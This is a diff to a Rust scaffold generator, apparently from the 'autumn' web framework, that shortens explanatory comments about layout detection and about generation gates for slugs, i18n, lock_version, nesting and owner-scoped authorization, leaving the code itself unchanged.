@@ -143,9 +143,7 @@ fn layout_param_counts(main_src: &str) -> Vec<usize> {
     let bytes = main_src.as_bytes();
     let mut counts = Vec::new();
     let mut i = 0;
-    // Walk the source tracking lexical state so `pub fn layout` occurrences
-    // inside comments/strings/char literals are skipped. When in normal code,
-    // a needle match yields a candidate whose arity we parse.
+    // Track lexical state so a `pub fn layout` inside a comment, string or char literal is skipped.
     while i < bytes.len() {
         if bytes[i..].starts_with(NEEDLE) {
             if let Some(count) = layout_arity_at(bytes, i + NEEDLE.len()) {
@@ -155,14 +153,13 @@ fn layout_param_counts(main_src: &str) -> Vec<usize> {
             continue;
         }
         match bytes[i] {
-            // Line comment: skip to end of line.
             b'/' if bytes.get(i + 1) == Some(&b'/') => {
                 i += 2;
                 while i < bytes.len() && bytes[i] != b'\n' {
                     i += 1;
                 }
             }
-            // Block comment: Rust block comments nest, so track depth.
+            // Block comments nest, so track depth.
             b'/' if bytes.get(i + 1) == Some(&b'*') => {
                 i += 2;
                 let mut depth = 1u32;
@@ -178,11 +175,9 @@ fn layout_param_counts(main_src: &str) -> Vec<usize> {
                     }
                 }
             }
-            // Raw string `r"..."` / `r#"..."#` (also byte variant `br...`).
             b'r' | b'b' if is_raw_string_start(bytes, i) && !prev_is_ident_char(bytes, i) => {
                 i = skip_raw_string(bytes, i);
             }
-            // Normal string literal (respecting `\"` escapes).
             b'"' => {
                 i += 1;
                 while i < bytes.len() {
@@ -196,10 +191,9 @@ fn layout_param_counts(main_src: &str) -> Vec<usize> {
                     }
                 }
             }
-            // Char literal `'x'` / `'\n'` — but not a lifetime like `'a`.
+            // Char literal, but not a lifetime like `'a`.
             b'\'' => {
                 if bytes.get(i + 1) == Some(&b'\\') {
-                    // Escaped char literal: skip to the closing quote.
                     i += 2;
                     while i < bytes.len() && bytes[i] != b'\'' {
                         i += 1;
@@ -208,7 +202,7 @@ fn layout_param_counts(main_src: &str) -> Vec<usize> {
                 } else if bytes.get(i + 2) == Some(&b'\'') {
                     i += 3;
                 } else {
-                    // Lifetime or label: treat the quote as ordinary punctuation.
+                    // Lifetime or label.
                     i += 1;
                 }
             }
@@ -251,7 +245,6 @@ pub(super) fn skip_raw_string(bytes: &[u8], start: usize) -> usize {
     }
     // Opening `"`
     i += 1;
-    // Scan for the closing `"` followed by `hashes` `#`.
     while i < bytes.len() {
         if bytes[i] == b'"' {
             let close = i + 1;
@@ -281,8 +274,7 @@ const fn prev_is_ident_char(bytes: &[u8], i: usize) -> bool {
 /// not nested inside `(...)`, `[...]`, or `<...>`, so generic/tuple/array types
 /// in a parameter don't inflate the count.
 fn layout_arity_at(bytes: &[u8], after_name: usize) -> Option<usize> {
-    // `layout` must be a whole token: the following char is `(`, `<`, or
-    // whitespace, so `layout_sidebar` and similar decoys don't count.
+    // `layout` must be a whole token, so `layout_sidebar` does not count.
     match bytes.get(after_name) {
         Some(b'(' | b'<') => {}
         Some(c) if c.is_ascii_whitespace() => {}
@@ -290,8 +282,7 @@ fn layout_arity_at(bytes: &[u8], after_name: usize) -> Option<usize> {
     }
 
     let mut i = after_name;
-    // Skip whitespace and an optional generic parameter block `<...>` that may
-    // precede the argument list.
+    // Skip an optional generic parameter block `<...>`.
     while i < bytes.len() && bytes[i].is_ascii_whitespace() {
         i += 1;
     }
@@ -315,13 +306,11 @@ fn layout_arity_at(bytes: &[u8], after_name: usize) -> Option<usize> {
             i += 1;
         }
     }
-    // The argument list must open here.
     if i >= bytes.len() || bytes[i] != b'(' {
         return None;
     }
 
-    // Walk to the matching `)`, counting commas that sit at the top level of
-    // the argument list (paren depth 1, no angle/bracket nesting).
+    // Count commas at the top level of the argument list.
     let mut paren = 0i32;
     let mut angle = 0i32;
     let mut bracket = 0i32;
@@ -341,8 +330,7 @@ fn layout_arity_at(bytes: &[u8], after_name: usize) -> Option<usize> {
             b'[' => bracket += 1,
             b']' => bracket -= 1,
             b'<' => angle += 1,
-            // Guard against `->` return arrows / comparison operators nested in
-            // a parameter type: only close an actually-open angle group.
+            // Only close an open angle group, so `->` in a parameter type is ignored.
             b'>' if angle > 0 => angle -= 1,
             b',' if paren == 1 && angle == 0 && bracket == 0 => commas += 1,
             b' ' | b'\t' | b'\r' | b'\n' | b'>' => {}
@@ -393,10 +381,8 @@ pub fn plan_scaffold_with_options(
     timestamp: &str,
     options: &ScaffoldOptions,
 ) -> Result<Plan, GenerateError> {
-    // Generation path: run the full plan, including the shared-layout preflight.
-    // `autumn destroy scaffold` recomputes the identical plan before reverting
-    // it, and must bypass that generate-only preflight (issue #1834); it reaches
-    // the builder through `plan_scaffold_with_options_for_revert` instead.
+    // Generate path, with the shared-layout preflight. Destroy goes through
+    // `plan_scaffold_with_options_for_revert`, which skips it (#1834).
     plan_scaffold_with_options_impl(project_root, name, field_tokens, timestamp, options, false)
 }
 
@@ -437,14 +423,10 @@ fn plan_scaffold_with_options_impl(
     for_revert: bool,
 ) -> Result<Plan, GenerateError> {
     ensure_project_root(project_root)?;
-    // Selects the SQLite-vs-Postgres halves of the scaffold's output: the field
-    // Rust types, the dependency set, and `autumn-web`'s feature list (#1924).
+    // Picks the SQLite or Postgres field types, dependencies and `autumn-web` features (#1924).
     let backend = super::detect_backend(project_root);
-    // Gate: UUID primary keys are not yet supported for scaffolds. Every scaffold
-    // emits a `#[autumn_web::repository]`, whose macro-generated REST API is
-    // currently hard-coded to `i64` primary keys (`Path<i64>`, `find_by_id`,
-    // cursor pagination), so a UUID-keyed scaffold would not compile. The model
-    // generator (`generate model --id uuid`) has no such limitation.
+    // The `#[repository]` REST API is hard-coded to `i64` primary keys, so a UUID-keyed
+    // scaffold would not compile. `generate model --id uuid` has no such limit.
     if options.model.id_type == IdType::Uuid {
         return Err(GenerateError::Config(
             "UUID primary keys are not yet supported for `generate scaffold`: the \
@@ -456,17 +438,10 @@ fn plan_scaffold_with_options_impl(
     }
     let mut fields = parse_fields(field_tokens)?;
     super::model::apply_unique_flags(&mut fields, &options.model.uniques)?;
-    // Gate (issue #1384): a `{translatable}` column holds a per-locale
-    // container, and the scaffold's CRUD form is a single plain text input
-    // bound to the whole column. Submitting it would REPLACE the container
-    // with one locale's value — silently destroying every other translation on
-    // the first edit — and the index/CSV/filter/sort paths would operate on
-    // the raw JSON. Editing translated content needs a per-locale form, which
-    // is translation-workflow UI and deliberately out of scope here. Refuse up
-    // front rather than emit a CRUD screen that eats data.
-    // `!for_revert`, like every other generation-only gate here: `autumn destroy
-    // scaffold` recomputes this plan before reverting it, and a refusal on that
-    // path would strand the very files the user asked to remove.
+    // A `{translatable}` column holds a per-locale container, but the CRUD form binds one
+    // text input to the whole column: saving it would replace every other locale's value
+    // (#1384). Skipped on revert, like every generate-only gate here, so destroy can still
+    // remove the files.
     if let Some(f) = fields
         .iter()
         .filter(|_| !for_revert)
@@ -486,14 +461,9 @@ fn plan_scaffold_with_options_impl(
     if !options.api {
         validate_enum_field_names_against_routes_imports(&fields, &pascal(name))?;
     }
-    // Gate (issue #1260): a `slug` field reroutes the standard (non-`--api`)
-    // HTML `show`/`edit`/`update`/`delete` routes and their generated links to
-    // key off the slug instead of `id` (see `render_routes_file`'s
-    // `route_key`). That rekeying is only wired for the plain, non-`--live`,
-    // non-`--sharded`, non-attachment, non-state-machine path so far — refuse
-    // the unsupported combinations up front rather than emit routes that
-    // silently keep keying off `id` (or, worse, half-rekey and fail to
-    // compile).
+    // A `slug` field rekeys the HTML show/edit/update/delete routes off the slug (#1260,
+    // `render_routes_file`'s `route_key`). Only the plain path is wired; the other variants
+    // would keep keying off `id` or half-rekey and fail to compile.
     if fields.iter().any(|f| f.kind.is_slug()) {
         if options.live || options.live_validation {
             return Err(GenerateError::Config(
@@ -524,26 +494,13 @@ fn plan_scaffold_with_options_impl(
             ));
         }
     }
-    // Gate (#1349): `--i18n` rewrites the standard HTML views' strings into
-    // `t!(locale, "key")` lookups, which need a `Locale` extractor in scope at the render
-    // site. Two families of view code have no such scope:
+    // `--i18n` views call `t!(locale, "key")`, which needs a `Locale` extractor at the render
+    // site (#1349). `--live`/`--live-validation` render outside a request, and `--belongs-to`
+    // splices into the parent's `show` handler, whose signature this generator does not own.
+    // Refuse rather than emit half-translated views.
     //
-    //   * `--live`/`--live-validation` render list rows from a `LiveFragment` impl driven
-    //     by an SSE broadcast, so there is no request and no locale;
-    //   * `--belongs-to` renders the child list and inline create form through the nested
-    //     renderer, which splices markup into the parent resource's already-generated
-    //     `show` handler, whose signature this generator does not own.
-    //
-    // Emitting half-translated views under a flag that promises translatable output is
-    // worse than refusing: the untranslated half surfaces only once someone adds a second
-    // locale. Same posture as the `slug` gates above.
-    //
-    // `for_revert` skips the gate so `autumn destroy scaffold` can still clean up a
-    // resource generated before the refusal existed (#1834). `--api` renders no labels,
-    // so `--i18n` is documented as a pure no-op there, which must include these refusals:
-    // otherwise `generate scaffold Common --api --i18n` fails while the identical `--api`
-    // scaffold succeeds, and a flag that changes nothing about the output would still
-    // change whether it is allowed to exist.
+    // Skipped on revert (#1834). `--i18n` is a documented no-op under `--api`, which renders
+    // no labels, so these refusals must not fire there either.
     if !for_revert && options.i18n && !options.api {
         let unsupported = if options.live {
             Some((
@@ -574,12 +531,9 @@ fn plan_scaffold_with_options_impl(
                  English-only scaffold."
             )));
         }
-        // A resource named `Common` would key its labels under `common.*` — the
-        // same namespace the shared chrome block owns. Its keys would be written
-        // into both blocks, and `destroy`ing it would strip the chrome every
-        // OTHER resource is still referencing, so those resources stop
-        // compiling (`t!` validates key existence at compile time). Refuse the
-        // name rather than emit a bundle that breaks its neighbours.
+        // `Common` would key its labels under `common.*`, the shared chrome namespace.
+        // Destroying it would strip keys every other resource uses, and `t!` checks keys at
+        // compile time, so those resources would stop compiling.
         if snake(name) == "common" {
             return Err(GenerateError::Config(
                 "`--i18n` cannot scaffold a resource named `Common`: its translation keys would \
@@ -591,30 +545,15 @@ fn plan_scaffold_with_options_impl(
             ));
         }
     }
-    // Gate (#1318): a `lock_version` column rewrites the HTML `update` handler's write
-    // into a `WHERE lock_version = $expected` guarded statement and adds a 409 re-render
-    // branch. That rewrite is wired for the standard raw-diesel write only.
-    // `--live`/`--sharded` write through the repository extractor, and the attachment
-    // path writes after a multipart blob save; generating those would emit an edit form
-    // that looks concurrency-safe while the write still clobbers. Refuse the combination
-    // up front rather than ship silently lossy code, as the `slug` gates above do.
+    // A `lock_version` column turns the HTML `update` into a `WHERE lock_version = $expected`
+    // write with a 409 re-render (#1318). Only the standard raw-diesel write is wired; the
+    // other variants would emit a form that looks concurrency-safe while the write clobbers.
     //
-    // `--api` is exempt outright, including `--api --live` and `--api --sharded`. Those
-    // variants change only the HTML surface, and an `--api` scaffold emits no routes file
-    // at all, so there is no form and no raw-diesel update to be inconsistent with. The
-    // model's `#[lock_version]` still lands, which is what makes the repository's own
-    // JSON update conflict-check. Refusing them would break combinations that generated
-    // fine before this feature existed.
-    //
-    // `for_revert` skips the whole gate: `autumn destroy scaffold` recomputes the plan it
-    // is about to revert, and a scaffold created before these refusals existed
-    // (`lock_version:i32 --live`, say) must still be removable. The refusal would fire
-    // during that recompute, before `Plan::revert` ever sees `--force`, and strand
-    // exactly the files the user asked to delete (#1834).
+    // `--api` emits no routes file, so it is exempt; the model's `#[lock_version]` still
+    // makes the repository's JSON update conflict-check. Skipped on revert so an older
+    // scaffold can still be destroyed (#1834).
     if !for_revert && !options.api && super::model::lock_version_field(&fields).is_some() {
-        // `--live-validation` is supported: it changes only how the form's
-        // controls are rendered (raw htmx inputs instead of `form_for`), while
-        // its `update` still writes through the same raw-diesel statement.
+        // `--live-validation` is supported: its `update` uses the same raw-diesel write.
         let unsupported = if options.live {
             Some((
                 "--live",
@@ -637,17 +576,9 @@ fn plan_scaffold_with_options_impl(
                 "Drop the attachment column",
             ))
         } else if fields.iter().any(|f| f.kind.is_slug()) {
-            // A slug scaffold keys its `update` off the slug, not the primary key
-            // (#1260), so the guarded statement would read `WHERE slug = $1 AND
-            // lock_version = $2`. That pair is not a stable row identity: the slug
-            // is editable and re-derivable, and every new row starts at version 0.
-            // Rename a row's slug, let a different row take the freed slug, and a
-            // stale submit against the old slug matches the new row at its default
-            // version — committing one author's edit over an unrelated record and
-            // reporting success. Keying the guard off the primary key is the real
-            // fix and needs the update handler to resolve the row first on every
-            // slug variant, including `--no-policy`, which loads nothing today.
-            // Refuse the pair until that lands.
+            // A slug scaffold keys `update` off the slug (#1260), and `(slug, lock_version)`
+            // is not a stable row identity: a freed slug taken by a new row at version 0 would
+            // let a stale submit commit over that unrelated record.
             Some((
                 "a `slug` column",
                 "a slug scaffold keys its update off the (editable, reusable) slug rather \
@@ -668,7 +599,7 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // Resolve shard key before planning the model (propagates to model render).
+    // Resolved before planning the model, which renders it.
     let resolved_shard_key = resolve_shard_key(&fields, &options.model)?;
     let model_options_with_key = ModelOptions {
         shard_key: resolved_shard_key,
@@ -704,15 +635,11 @@ fn plan_scaffold_with_options_impl(
         )?
     };
     let mut metadata = parse_model_metadata_for(backend, &fields, &options_with_key.model)?;
-    // Issue #1367: see `model::plan_model` — `by` is emitted only when the
-    // author model it names is really there.
+    // `by` is emitted only when the author model exists (#1367).
     metadata.set_commentable_author(super::commentable::detect_author_model(project_root));
-    // A `--default field=value` column is dropped from `form_fields` (see
-    // below) and therefore from the generated `New{Pascal}` insert struct
-    // entirely (it's set at the SQL `DEFAULT` level instead) — a slug can't
-    // derive `from:` it, since the create handler's `new.{from}` wouldn't
-    // exist to read. dsl.rs's `validate_slug_fields` can't catch this itself:
-    // `--default` metadata isn't visible until here.
+    // A `--default` column is dropped from `form_fields` and the `New{Pascal}` insert struct,
+    // so a slug cannot derive `from:` it. `validate_slug_fields` cannot catch this: the
+    // `--default` metadata is first visible here.
     if let Some(slug) = fields.iter().find(|f| f.kind.is_slug())
         && let Some(from) = slug.constraints.from.as_deref()
         && metadata.defaults().contains_key(from)
@@ -730,19 +657,14 @@ fn plan_scaffold_with_options_impl(
         .filter(|field| !metadata.defaults().contains_key(&field.name))
         .cloned()
         .collect::<Vec<_>>();
-    // The equivalent guard for the insert struct (issue #1318) lives in
-    // `plan_model_with_options`, which the scaffold delegates to above — so a
-    // lock-only scaffold is refused before it reaches here, and `generate model`
-    // gets the same refusal without the scaffold planner having to be involved.
+    // A lock-only insert struct is already refused by `plan_model_with_options` (#1318).
     let pascal_name = pascal(name);
     let snake_name = snake(name);
     let plural = pluralize(&snake_name);
 
-    // ── Parent/child nesting (issue #1323) ─────────────────────────────────
-    // `--belongs-to Post` binds this resource to a parent: nested routes here,
-    // a children list + inline create form injected into the parent's own
-    // `show` view below. `None` for every flat scaffold, which keeps all of the
-    // emission below byte-for-byte what it was before this feature existed.
+    // ── Parent/child nesting (#1323) ──
+    // `--belongs-to Post` nests the routes and injects a children list and inline create
+    // form into the parent's `show` view. `None` for a flat scaffold.
     let nesting = super::nested::resolve(
         project_root,
         &plural,
@@ -751,20 +673,10 @@ fn plan_scaffold_with_options_impl(
         for_revert,
     )?;
 
-    // #1349: the `--belongs-to` refusal above reads the command line, and the command
-    // line is not where a nesting necessarily comes from. `resolve` deliberately recovers
-    // the relationship from the markers in the parent's routes file when the flag is not
-    // repeated — the ordinary "I changed a field, re-scaffold it" run. Without this second
-    // gate, `generate … --force --i18n` on an existing child is accepted and emits nested
-    // views whose heading, empty state, add button, and parent backlink are still
-    // hardcoded English: exactly the half-translated module the refusal exists to prevent.
-    //
-    // Two gates rather than one moved gate. The early one needs no disk reads and fires
-    // on the typed flag even in a project where `resolve` would fail first for an
-    // unrelated reason — an unscaffolded parent, say — so the user hears about the
-    // combination they asked for rather than about a precondition they would then satisfy
-    // only to be refused anyway. This one is reachable only for a recovered nesting, and
-    // says so.
+    // The earlier `--belongs-to` refusal reads only the command line, but `resolve` also
+    // recovers a nesting from the parent's routes-file markers when the flag is not repeated
+    // (#1349). This second gate catches that case. The early gate stays so the typed flag is
+    // refused before `resolve` can fail for an unrelated reason.
     if !for_revert
         && options_with_key.i18n
         && !options_with_key.api
@@ -785,11 +697,9 @@ fn plan_scaffold_with_options_impl(
         )));
     }
 
-    // ── Counter cache (issue #1325) ────────────────────────────────────────
-    // `--counter-cache` maintains `{parent}.{child}_count`. The maintenance is
-    // declared on the CHILD's `belongs_to`, so the flag only makes sense
-    // alongside `--belongs-to` — which is also what supplies the parent's name
-    // and table.
+    // ── Counter cache (#1325) ──
+    // `--counter-cache` maintains `{parent}.{child}_count` from the child's `belongs_to`, so
+    // it needs `--belongs-to`.
     if options_with_key.counter_cache {
         let Some(n) = nesting.as_ref() else {
             return Err(GenerateError::Config(
@@ -799,9 +709,8 @@ fn plan_scaffold_with_options_impl(
                     .to_owned(),
             ));
         };
-        // The migration actions go on the revert plan too — that is how
-        // `Plan::revert` finds the directory to remove. Only the follow-up
-        // warning is generate-only.
+        // The migration is pushed on revert too: that is how `Plan::revert` finds the directory
+        // to remove. Only the warning is generate-only.
         super::counter_cache::push_counter_cache_migration(
             &mut plan,
             project_root,
@@ -817,9 +726,8 @@ fn plan_scaffold_with_options_impl(
                 &n.parent_plural,
             );
         }
-        // Opt the generated child model in. The model file is an action this
-        // plan is about to create, so the attribute is added by rewriting that
-        // pending content rather than by touching the disk twice.
+        // Opt the child model in. Its file is a pending `Create` in this plan, so rewrite those
+        // contents rather than touching the disk twice.
         let model_path = project_root
             .join("src")
             .join("models")
@@ -839,16 +747,11 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // ── Polymorphic comments (issue #1367) ─────────────────────────────────
-    // The model plan above adds the shared `comments` migration and its
-    // warnings. Do not add them again here.
+    // Polymorphic comments (#1367): the model plan already adds the shared `comments`
+    // migration and its warnings. Do not add them again here.
 
-    // ── Record-level authorization (issue #1125) ───────────────────────────
-    // A policy is generated by default for every non-`--api` scaffold unless
-    // `--no-policy` is passed.
+    // ── Record-level authorization (#1125) ──
     let policy_on = !options_with_key.api && !options_with_key.no_policy;
-    // Owner-column detection (AC3): drives the ownership check in the generated
-    // policy and the authorize/scope wiring in the HTML handlers.
     let owner_column = {
         let columns: Vec<String> = fields.iter().map(|f| f.name.clone()).collect();
         let user_refs: Vec<String> = fields
@@ -857,8 +760,7 @@ fn plan_scaffold_with_options_impl(
             .map(|f| f.name.clone())
             .collect();
         super::policy::detect_owner_column(&columns, &user_refs).map(|name| {
-            // A nullable owner column (e.g. `user:references?`) is `Option<i64>`
-            // and must be compared option-to-option in the generated policy.
+            // A nullable owner column is `Option<i64>`; the policy compares option-to-option.
             let nullable = fields
                 .iter()
                 .find(|f| f.name == name)
@@ -866,44 +768,23 @@ fn plan_scaffold_with_options_impl(
             super::policy::OwnerColumn { name, nullable }
         })
     };
-    // #1830: inline record-level authorization is emitted on every scaffold variant —
-    // standard, `--live`, `--sharded`, attachment — whenever a policy is generated,
-    // including the no-owner case. The per-variant plumbing differs (repository, raw
-    // diesel, or a reused attachment `State`) but every mutating handler loads its target
-    // row and record-authorizes the actor. Routing the mutation through the policy gives
-    // the developer one place to tighten the rule. The generated no-owner policy
-    // authorizes any authenticated user — no regression over the prior `#[secured]`-only
-    // handlers, which already let any authenticated user mutate any row (see `policy.rs`)
-    // — so a fresh no-owner scaffold never 403s out of the box.
+    // Every variant record-authorizes its mutating handlers whenever a policy is generated
+    // (#1830). With no owner column the policy allows any authenticated user, so a fresh
+    // scaffold never 403s; the policy is the one place to tighten the rule.
     let authorize_routes = policy_on;
-    // Whether the index is owner-scoped: only when an owner column exists. A
-    // no-owner scaffold authorizes its handlers but keeps the unscoped index
-    // (there is no column to filter on).
+    // Whether the index is owner-scoped. Without an owner column there is nothing to filter on.
     let owner_authorizes = policy_on && owner_column.is_some();
-    // The standard (non-live, non-sharded) diesel OWNER path. Retained as the
-    // signal for the cross-user 403 smoke test, which drives real HTTP create/
-    // update/delete as two users and is only meaningful with an owner column (the
-    // no-owner policy authorizes any authenticated user, so a cross-user denial
-    // would not hold) and only wired for the plain diesel path (the live SSE and
-    // sharded runtimes need extra harness the smoke test doesn't set up).
+    // The standard (non-live, non-sharded) owner path. Gates the cross-user 403 smoke test,
+    // which needs an owner column and the plain diesel runtime.
     let authorize_wiring = owner_authorizes
         && !options_with_key.model.sharded
         && !options_with_key.live
         && !options_with_key.live_validation;
 
-    // #1841: owner-scoped full-text search is supported on the standard (non-live,
-    // non-sharded) Db path. The `#[repository(..., owner = <col>)]` attribute makes the
-    // macro emit an owner-filtered `search_page_scoped` and `list_scoped`, and the
-    // generated `GET /{plural}/search` plus owner-scoped index call only those scoped
-    // methods, never the unscoped `search_page`/`page`. So `--searchable` with owner
-    // scoping is safe there and no longer refused.
-    //
-    // The `--sharded` owner path is not yet wired: its index and search still run through
-    // per-shard raw diesel and the unscoped `search_page`, and a scoped cross-shard FTS
-    // is out of scope here. Search is force-disabled for `--live`/`--live-validation`
-    // (see `search_enabled`), so the only remaining unsafe combination is owner-scoped
-    // `--sharded --searchable` — keep refusing exactly that. Returns before the plan is
-    // built, so no files are written.
+    // Owner-scoped search uses the macro's `search_page_scoped` on the standard path (#1841).
+    // The sharded path still searches through the unscoped `search_page`, which would leak
+    // other users' rows. Live variants disable search, so only owner-scoped
+    // `--sharded --searchable` is refused.
     if !options_with_key.model.searchable.is_empty()
         && owner_authorizes
         && options_with_key.model.sharded
@@ -922,15 +803,10 @@ fn plan_scaffold_with_options_impl(
         )));
     }
 
-    // `references` columns whose target model cannot be found in the project, by the same
-    // presence test `check_reference_targets` uses for its warning — the table presumably
-    // exists out of band, or is generated later. Their "select over the referenced table's
-    // ids" promotion (#1135 AC 2) needs the target's `src/schema.rs` entry at compile
-    // time, so the routes renderer skips the select machinery for these columns and lets
-    // them fall back to the derived numeric id input: a warning-only missing target has
-    // always produced compilable output, and importing a nonexistent schema module would
-    // break that. A self-referential column, whose target is this scaffold's own table, is
-    // never missing — its schema entry is being generated right now.
+    // `references` columns whose target model is not in the project (same test as
+    // `check_reference_targets`). The id select (#1135) needs the target's `src/schema.rs`
+    // entry, so these fall back to a numeric id input to keep the output compiling. A
+    // self-reference is never missing: its schema entry is being generated now.
     let missing_reference_targets: BTreeSet<String> = form_fields
         .iter()
         .filter(|f| f.kind.is_reference())
@@ -965,14 +841,9 @@ fn plan_scaffold_with_options_impl(
             ));
         }
     }
-    // An explicit `{label:col}` override that names a column the target model
-    // doesn't expose as a string would generate a `select {table}::{col}`
-    // (loaded as `String`) that fails to compile the generated app. The display
-    // resolver falls back to the heuristic display column in that case
-    // (see `resolve_reference_display`), so warn the author their label was
-    // ignored rather than silently swapping it. Skipped for a missing target
-    // (already warned above) and when the model isn't discoverable (the
-    // override can't be validated, so it's honored as-is).
+    // A `{label:col}` that is not a string column on the target would not compile, so
+    // `resolve_reference_display` falls back to the default display column. Warn that the
+    // label was ignored. Skipped for a missing target, which was already warned about.
     for f in form_fields.iter().filter(|f| f.kind.is_reference()) {
         if missing_reference_targets.contains(&f.name) {
             continue;
@@ -981,14 +852,9 @@ fn plan_scaffold_with_options_impl(
             continue;
         };
         let base = f.name.strip_suffix("_id").unwrap_or(&f.name);
-        // Self-ref-aware: a self-reference's columns come from the in-flight
-        // fields, so `Category category:references{label:name}` doesn't warn
-        // that the not-yet-on-disk model "has no string columns".
+        // A self-reference reads its columns from the in-flight fields, not the disk.
         let columns = target_string_columns(project_root, f, &plural, &form_fields);
         if !columns.iter().any(|(c, _)| c == label) {
-            // Covers both a wrong column name AND a target with no string
-            // columns at all — in the latter case there is nothing to fall back
-            // to, so the reference renders its raw id.
             let detail = if columns.is_empty() {
                 format!("the '{base}' model has no string columns")
             } else {
@@ -1009,7 +875,6 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // Repository file under `src/repositories/<snake>.rs`
     let repos_dir = project_root.join("src").join("repositories");
     plan.create(
         repos_dir.join(format!("{snake_name}.rs")),
@@ -1022,21 +887,12 @@ fn plan_scaffold_with_options_impl(
             options_with_key.model.sharded,
             options_with_key.live,
             !options_with_key.model.searchable.is_empty(),
-            // Issue #1841: emit `owner = <col>` (→ the macro's `list_scoped` /
-            // `search_page_scoped` codegen) only on the standard owner-scoped Db
-            // path — `authorize_wiring` is exactly `owner present && policy on &&
-            // !sharded && !live && !live_validation`, the path whose index/search
-            // this PR wires to the scoped methods. Live/sharded owner indexes are
-            // left as #1830 emitted them (follow-up), so they get no `owner =`.
+            // `owner = <col>` only on the standard owner path, whose index and search call
+            // the scoped methods (#1841).
             authorize_wiring
                 .then(|| owner_column.as_ref().map(|o| o.name.as_str()))
                 .flatten(),
-            // Issue #1358: `position(...)` is rejected outright by
-            // `#[repository(..., sharded)]` at macro-expansion time (a move
-            // only reaches the pool/shard it happens to be given — see
-            // autumn-macros' `parse_repo_args`), so a `--sharded` scaffold
-            // must never emit it, or the generated project fails to compile
-            // with a macro error instead of a clear generate-time one.
+            // The macro rejects `position(...)` together with `sharded` (#1358).
             (!options_with_key.model.sharded)
                 .then(|| fields.iter().find(|f| f.kind.is_position()))
                 .flatten(),
@@ -1052,15 +908,8 @@ fn plan_scaffold_with_options_impl(
         name: snake_name.clone(),
     });
 
-    // …and the mirror: children nested INTO this resource. Destroying a parent
-    // out from under them deletes the module they still import
-    // (`crate::routes::<parent>::paths`, `schema::<parents>`) and leaves their
-    // nested routes mounted — an uncompilable project. The default destroy
-    // already stops, but only by accident: the injected section reads as
-    // diverged content, whose message says nothing about children and which
-    // `--force` waves straight through. Refuse explicitly
-    // instead, naming them, so `--force` cannot turn a deliberate override of
-    // one check into silent breakage of another.
+    // Destroying a parent deletes the module its nested children import and leaves their
+    // routes mounted. Refuse explicitly, naming them, so `--force` cannot push it through.
     if for_revert && !options_with_key.api {
         let dependents = super::nested::children_nested_under(project_root, &plural);
         if !dependents.is_empty() {
@@ -1080,21 +929,16 @@ fn plan_scaffold_with_options_impl(
         }
     }
 
-    // Parents this resource is currently nested under, discovered from the
-    // `// autumn:nested:<plural>` markers already on disk (issue #1323). On the
-    // GENERATE path this is always empty — the marker is written by the `Modify`
-    // this same run is about to plan — so it costs one directory scan and
-    // changes nothing. On the DESTROY path it is the ONLY evidence available
-    // when `--belongs-to` was not repeated on the command line, and it drives
-    // both the parent-side cleanup and the `main.rs` unmounting below.
+    // Parents this resource is nested under, from the `// autumn:nested:<plural>` markers on
+    // disk (#1323). On destroy this is the only evidence when `--belongs-to` is not repeated;
+    // it drives the parent-side cleanup and the `main.rs` unmounting below.
     let nested_parents = if options_with_key.api {
         Vec::new()
     } else {
         super::nested::parents_carrying_child(project_root, &plural)
     };
 
-    // Nesting recovered from the markers rather than declared: say so, since the
-    // emitted module then carries nested routes the command line never asked for.
+    // Warn when the nesting came from markers, not the command line.
     if let Some(n) = nesting.as_ref()
         && n.inferred
         && !for_revert
@@ -1108,43 +952,22 @@ fn plan_scaffold_with_options_impl(
             pascal = n.parent_pascal,
         ));
     }
-    // Route file under `src/routes/<plural>.rs`
     if !options_with_key.api {
-        // The shared-layout preflight applies only to standard scaffolds, which render
-        // their HTML views through the application's shared `crate::layout(title,
-        // current_path, flash, content)`. Live and live-validation scaffolds are
-        // self-contained: they emit their own private `fn layout` and never call
-        // `crate::layout`, so an app without a shared layout must not block them. This
-        // mirrors the renderer's `shared_layout = !live && !live_validation`.
-        // `for_revert` additionally skips the preflight on the `autumn destroy scaffold`
-        // path: it recomputes this plan before reverting it, and the generate-only guard
-        // must not hard-fail cleanup (#1834).
+        // Only standard scaffolds call the shared `crate::layout`; live variants emit their
+        // own (the renderer's `shared_layout`). Skipped on revert so destroy can clean up
+        // (#1834).
         if !options_with_key.live && !options_with_key.live_validation && !for_revert {
-            // Issue #1130: scaffolded HTML views render through the application's
-            // shared `crate::layout`, so the target app must expose one with the
-            // matching signature. Detect it by looking for a `pub fn layout` in
-            // `src/main.rs` (as generated by `autumn new`). If it's missing — or
-            // present with the wrong arity — fail early with an actionable message
-            // rather than emitting routes that call a nonexistent or mismatched
-            // `crate::layout`.
+            // Fail early when `src/main.rs` lacks the shared `pub fn layout` the views call
+            // (#1130).
             let main_for_layout_check = project_root.join("src").join("main.rs");
             let main_src = match std::fs::read_to_string(&main_for_layout_check) {
                 Ok(src) => src,
-                // `main.rs` genuinely absent: surface the actionable message below
-                // by treating it as an empty source (no `pub fn layout` present).
+                // Absent `main.rs` reaches the actionable message below.
                 Err(e) if e.kind() == std::io::ErrorKind::NotFound => String::new(),
-                // Any other io error (e.g. PermissionDenied) must preserve its
-                // original `ErrorKind` + OS message rather than being masked.
                 Err(e) => return Err(GenerateError::Io(e)),
             };
-            // The generated routes call the 4-arg
-            // `crate::layout(title, current_path, flash, content)`, so a shared
-            // layout must exist AND take exactly 4 parameters. `has_shared_layout`
-            // matches `layout` as a complete token (so decoys like
-            // `pub fn layout_sidebar` are ignored), ignores `pub fn layout`
-            // tokens that appear inside comments or string literals, and rejects
-            // an older/custom 2-arg `pub fn layout(title, content)` that would
-            // otherwise pass the preflight and then fail to compile.
+            // The routes call the 4-arg `crate::layout(title, current_path, flash, content)`;
+            // an older 2-arg layout would pass a presence check and then fail to compile.
             if !has_shared_layout(&main_src) {
                 return Err(GenerateError::Config(
                     "`autumn generate scaffold` requires a shared `pub fn layout` in src/main.rs \
@@ -1159,25 +982,17 @@ fn plan_scaffold_with_options_impl(
         }
         let routes_dir = project_root.join("src").join("routes");
         let own_routes_path = routes_dir.join(format!("{plural}.rs"));
-        // This resource may itself be a PARENT: its `show` can carry sections
-        // injected for children nested under it (issue #1323). The flat template
-        // below knows nothing about those, so a `--force` regeneration would
-        // overwrite them away — silently dropping the children list AND the only
-        // durable record of the relationship, after which a child regeneration
-        // would emit no nested handlers while `main.rs` still mounted them.
-        // Re-apply them onto the fresh render instead. Empty for the common
